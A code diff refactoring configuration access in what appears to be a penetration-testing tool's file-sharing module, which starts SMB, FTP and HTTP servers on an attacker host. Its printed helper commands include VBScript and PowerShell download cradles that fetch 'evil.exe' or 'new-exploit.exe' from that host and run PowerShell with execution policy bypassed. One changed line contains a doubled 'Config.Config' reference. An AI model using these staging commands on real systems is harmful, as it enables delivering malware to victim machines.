@@ -19,8 +19,8 @@ def share_smb(cmd=None):
                 print("{}SMB Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
             else:
                 try:
-                    os.chdir(Config.PATH+"/db/shares")
-                    smbServer(Config.HOSTIP,Config.SMBPORT,Config.SMBUSER,Config.SMBPASS,Config.PATH+"/db/shares")
+                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares")
+                    smbServer(Config.CONFIG['GENERAL']['PATH']+"/db/shares")
                     return
                 except Exception as e:
                     print("{}".format(e))
@@ -40,7 +40,7 @@ def share_smb(cmd=None):
             else:
                 print("{}SMB Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
         elif cmd[1] == "cmd":
-            print("{}smbclient -L //{}/{}".format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
+            print("{}net use Z: \\{}\SHARES /USER:\{} {} /PERSISTENT:YES{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['SMBUSER'],Config.CONFIG['SHARES']['SMBPASSD'],bcolors.ENDC))
         else:
             print("{}Usage: smb <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
             return
@@ -67,8 +67,8 @@ def share_ftp(cmd=None):
             else:
                 print("{}FTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
         elif cmd[1] == "cmd":
-            print("{}echo open {} {} > ftp.txt{}".format(bcolors.OKBLUE,Config.HOSTIP,Config.FTPPORT,bcolors.ENDC))
-            print("{}echo USER {} {} >> ftp.txt{}".format(bcolors.OKBLUE,Config.FTPUSER,Config.FTPPASS,bcolors.ENDC))
+            print("{}echo open {} {} > ftp.txt{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['FTPPORT'],bcolors.ENDC))
+            print("{}echo USER {} {} >> ftp.txt{}".format(bcolors.OKBLUE,Config.CONFIG['SHARES']['FTPUSER'],Config.CONFIG['SHARES']['FTPPASSD'],bcolors.ENDC))
             print("{}echo bin >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
             print("{}echo GET {{file}} >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
             print("{}echo bye >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
@@ -85,8 +85,8 @@ def share_ftp(cmd=None):
                 print("{}FTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
             else:
                 try:
-                    os.chdir(Config.PATH+"/db/shares/"+cmd[2])
-                    ftpServer(Config.HOSTIP,Config.FTPPORT,Config.FTPUSER,Config.FTPPASS)
+                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares/"+cmd[2])
+                    ftpServer(Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['FTPPORT'],Config.CONFIG['SHARES']['FTPUSER'],Config.CONFIG['SHARES']['FTPPASSD'])
                     return
                 except Exception as e:
                     print("{}".format(e))
@@ -110,8 +110,8 @@ def share_http(cmd=None):
                 print("{}HTTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
             else:
                 try:
-                    os.chdir(Config.PATH+"/db/shares")
-                    httpServer(Config.HOSTIP,Config.HTTPPORT)
+                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares")
+                    httpServer(Config.CONFIG['GENERAL']['HOSTIP'],Config.Config.CONFIG['SHARES']['HTTPPORT'])
                     return
                 except Exception as e:
                     print("{}".format(e))
@@ -133,7 +133,7 @@ def share_http(cmd=None):
                 print("{}HTTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
             
         elif cmd[1] == "cmd":
-            print("{}wget http://{}/{{PATH}}{}".format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
+            print("{}wget http://{}/{{PATH}}{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
         else:
             print("{}Usage: http <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
             return
@@ -170,7 +170,7 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
 cscript wget.vbs http://{}/evil.exe evil.exe{}
-    """.format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
+    """.format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
     return
 def share_powershell(cmd=None):
     print("""
@@ -181,7 +181,7 @@ echo $file = "new-exploit.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1{}
-    """.format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
+    """.format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
     return
 
 switcher_share = {"smb":share_smb,"ftp":share_ftp,"http":share_http,"powershell":share_powershell,"vbscript":share_vbscript}
